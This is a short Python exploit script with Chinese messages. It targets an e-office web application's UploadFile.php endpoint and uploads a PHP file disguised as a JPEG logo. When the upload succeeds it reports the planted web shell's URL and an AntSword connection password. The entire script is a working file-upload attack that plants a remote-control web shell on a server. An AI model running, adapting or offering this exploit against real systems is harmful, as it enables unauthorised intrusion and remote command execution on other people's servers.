#!/usr/bin/env python
# -*- coding:utf-8 -*-
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning


def getShell(target_url):
    vuln_url = str(target_url + "general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=")
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Language": "zh-CN,zh-TW;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "close",
        "Cookie": "LOGIN_LANG=cn; PHPSESSID=0acfd0a2a7858aa1b4110eca1404d348",
        "Content-Length": "170",
    }

    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    try:
        files = {'Filedata': ('test.php',open('test.txt', 'rb'),'image/jpeg',)}       # 上传文件
        res = requests.post(url=vuln_url, files=files, headers=headers,timeout=20,verify=False)
        if res.text == 'logo-eoffice.php':
            getShell_url = target_url + "images/logo/logo-eoffice.php"
            a = "漏洞利用成功，shell地址：\n"+ getShell_url+"\n蚁剑马，链接密码为a=19194f43431051114748141611065b55584a1d72312d366d76000e5d6b1c&cmd"
            return a
        else:
            b = "漏洞没有利用成功"
            return b
    except:
        c = "URL格式输入错误,请点击清除，按照例子来严格输入URL，不要忘记最后面的'/'"
        return c
